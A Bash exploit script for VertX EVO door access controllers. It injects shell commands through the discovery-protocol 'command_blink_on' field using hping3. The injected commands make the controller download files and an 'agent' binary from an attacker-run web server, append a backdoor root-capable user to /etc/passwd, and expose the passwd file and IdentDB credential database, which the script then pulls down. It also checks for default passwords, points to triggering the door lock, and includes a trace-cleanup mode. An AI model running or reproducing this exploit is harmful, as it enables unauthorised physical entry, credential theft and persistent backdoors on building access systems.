#!/bin/bash
###########################################################################
# Writen by Mike Kelly                                                    #
# twitter.com/lixmk                                                       #
# github.com/lixmk                                                        #
# exfil.co                                                                #
###########################################################################
#                                                                         # 
#                Concierge - VertX EVO Exploitation Script                #
#                                                                         #
###########################################################################
#                                                                         #
# This program is free software: you can redistribute it and/or modify    #
# it under the terms of the GNU General Public License as published by    #
# the Free Software Foundation, either version 3 of the License, or       #
# at your option) any later version.                                      #
#                                                                         #
# This program is distributed in the hope that it will be useful,         #
# but WITHOUT ANY WARRANTY; without even the implied warranty of          #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
# GNU General Public License for more details.                            #
#                                                                         #
# You should have received a copy of the GNU General Public License       #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                         #
###########################################################################

# Deciding what we need to do here
echo "[+] Would you like to exploit a new VertX EVO or cleanup a previously exploited controller?"
echo -n "[+] exploit or cleanup: "
read -e JOB
if [ $JOB != "exploit" ] || [ $JOB != "cleanup" ]
then
  # Response required is verbatim "exploit" or "cleanup"
  echo "[!] Nope. Please respond exactly as provided."
  echo -n "[+] exploit or cleanup: "
  read -e JOB
  if [ $JOB != "exploit" ] || [ $JOB != "cleanup" ]
  then
    # Seriously type either "exploit" to exploit or "cleanup" to clean up.
    echo '[!] Still Nope. '$JOB' is not "exploit" or "cleanup"!'
    echo '[!] Please try again later.'
    exit 1
  fi
fi

if [ $JOB == exploit ]
then
  echo "[*] Fresh Exploit. Let's get started."
  # Set the follwoing 4 variables
  echo "[*] Setting Variables..."
  echo -n "Target IP: "
  read -e TARGET
  echo -n "Target MAC: "
  read -e TMAC
  echo -n "LHOST IP"
  read -e LHOST

  #Finding hping3
  CMDEXEC=`which hping3`
  
  #Creating data files
  echo "[*] Creating Data files"
  mkdir ./datafiles
  cd ./datafiles
  echo 'command_blink_on;044;'${TMAC}';1`wget -O /tmp/z http://'${LHOST}/z'`;' > data1.txt
  echo 'command_blink_on;044;'${TMAC}';1`cat /tmp/z >> /etc/passwd`;' > data2.txt
  echo 'command_blink_on;044;'${TMAC}';1`wget -O /tmp/agent http://'${LHOST}'/a`;' > data3.txt
  echo 'command_blink_on;044;'${TMAC}';1`chmod +x /tmp/agent`;' > data4.txt
  echo 'command_blink_on;044;'${TMAC}';1`cp /etc/passwd /mnt/apps/web/`;' > data5.txt
  echo 'command_blink_on;044;'${TMAC}';1`ln -s /mnt/apps/data/config/IdentDB /idb`;' > data6.txt
  echo 'command_blink_on;044;'${TMAC}';1`cp /idb /mnt/apps/web/`;' > data7.txt
  echo 'z:$1$$.hpbaOY9sKSvVyW6rVvh8.:503:500:Linux User,,,:/home/z:/bin/sh' > /var/www/html/z
  cp ../tools/agent /var/www/html/a
  echo "[*] Data files created"

  #Starting necessary services (apache2)
  service apache2 start

  #Starting command injections
  echo "[*] Executing"
  echo "[*] Sending Payload 1"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 2"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data2.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 3"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data3.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 4"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data4.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 5"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data5.txt -d 150 ${TARGET} 2> /dev/null
  echo ""
  
  echo "[*] Sending Payload 6"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data6.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 7"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data7.txt -d 150 ${TARGET} 2> /dev/null
  echo ""
  cd ../
  echo "[*] Command Injections Complete."

  #Exfiltraiting sensitive files
  #TODO: Impliment error checking on file exfil
  echo "[*] Exfiltrating passwd file and IdentDB."
  wget --user=z --password=backdoor -O idb http://${TARGET}/idb 
  wget --user=z --password=backdoor -O passwd http://${TARGET}/passwd

  echo "[*] Checking shadow for default passwords"
  if [ $(egrep -q xRH0tNmOG1 passwd) = 1 ]
  then
    echo "[!] Default root:pass user/pass combo found."
  fi
  if [ $(egrep -q MPUVM6G7uu passwd) = 1 ]
  then
    echo "[!] Default modem1:modem1 user/pass combo found."
  fi
  if [ $(egrep -q VFVf68vUI0 passwd) = 1 ]
  then
    echo "[!] Default router1:router1 user/pass combo found."
  fi
  echo "[*] Exploitation Complete."
  echo "[*] Login at https://${TARGET}/ with z:backdoor for manual control over the VertX EVO."
  echo "[*] Or use door.sh to trigger the locking mechanism from commandline."
  exit 1
 fi

#Cleaning up post exploitation.
if [ $JOB == cleanup ]
then
  echo "[*] Cleaning up previous exploitation."
  echo "[*] Setting Variables..."
  echo -n "Target IP: "
  read -e TARGET
  echo -n "Target MAC: "
  read -e TMAC

  #Creating Data Files
  echo "[*] Creating Data files."
  if [ $(ls | egrep -q datafiles) = 0 ]
  then
    mkdir datafiles
    cd ./datafiles
  else
    cd ./datafiles
  fi
  echo 'command_blink_on;044;'${TMAC}';1`deluser z`;' > data8.txt
  echo 'command_blink_on;044;'${TMAC}';1`rm /tmp/z`;' > data9.txt
  echo 'command_blink_on;044;'${TMAC}';1`rm /idb /mnt/apps/web/idb`;' > data10.txt
  echo 'command_blink_on;044;'${TMAC}';1`rm /mnt/apps/web/passwd`;' > data11.txt
  echo 'command_blink_on;044;'${TMAC}';1`rm /tmp/agent`;' > data12.txt  
  #Executing
  echo "[*] Executing cleanup."
  echo "[*] Sending Payload 1"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data8.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 2"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data9.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 3"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data10.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 4"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data11.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 5"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data12.txt -d 150 ${TARGET} 2> /dev/null
  echo ""
  cd ../
  echo "Cleanup Complete."
  exit 1
fi
exit 1
